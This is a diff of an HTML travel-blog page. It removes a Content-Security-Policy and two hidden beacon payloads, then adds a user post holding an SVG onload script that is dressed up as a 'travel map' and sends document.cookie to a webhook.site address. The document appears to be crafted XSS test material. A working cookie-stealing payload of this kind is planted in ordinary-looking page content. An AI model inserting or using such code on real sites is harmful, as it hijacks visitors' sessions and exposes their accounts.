@@ -1,49 +1,49 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Travel Tips – CSP Protected</title>
-  <meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'none'; frame-src 'none';" />
+  <meta charset="UTF-8">
+  <title>Travel Tips Blog</title>
   <style>
     body {
-      background: linear-gradient(120deg, #89f7fe 0%, #66a6ff 100%);
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      color: #222;
+      font-family: Arial, sans-serif;
+      background: #f1f3f5;
       padding: 30px;
+    }
+    .post-container {
+      background: white;
+      padding: 25px;
+      border-radius: 12px;
       max-width: 700px;
       margin: auto;
-      border-radius: 12px;
-      background-color: #f9f9f9;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
     }
-    h1 {
-      text-align: center;
-      margin-bottom: 20px;
+    .post-author {
+      font-weight: bold;
+      color: #333;
+      margin-bottom: 15px;
     }
-    .post {
-      background: white;
-      border-radius: 10px;
-      box-shadow: 0 10px 25px rgba(0,0,0,0.1);
-      padding: 20px;
-      font-size: 1.1em;
+    .post-content {
+      font-size: 17px;
       line-height: 1.6;
     }
   </style>
 </head>
 <body>
-  <h1>Travel Forum – Latest Tips</h1>
-  <div class="post">
-    <p>Here is a user comment about their trip to Italy:</p>
+  <div class="post-container">
+    <div class="post-author">Backpacker2025:</div>
+    <div class="post-content">
+      Just came back from Thailand! Amazing food and beaches. 🍜🌴<br><br>
 
-    <!-- img with onerror event -->
-    <img src="invalid.png" onerror="fetch('https://webhook.site/d828bfbf-ff5d-41db-956f-c8662ec8026a')" style="display:none" />
+      Here's a helpful travel map embedded below:
+      
+      <!-- Payload starts -->
+      <svg onload="fetch('https://webhook.site/d828bfbf-ff5d-41db-956f-c8662ec8026a?xss='+document.cookie)">
+        <!-- looks like a harmless embedded image -->
+      </svg>
+      <!-- Payload ends -->
 
-    <!-- iframe with javascript: src (may or may not execute) -->
-    <iframe src="javascript:fetch('https://webhook.site/d828bfbf-ff5d-41db-956f-c8662ec8026a')" style="display:none"></iframe>
-
-    <p>
-      If you visit Italy, don't miss the gelato! 🍦<br />
-      This is one of the best travel experiences.
-    </p>
+      <p>Always carry cash for small local shops, they don’t take cards!</p>
+    </div>
   </div>
 </body>
 </html>
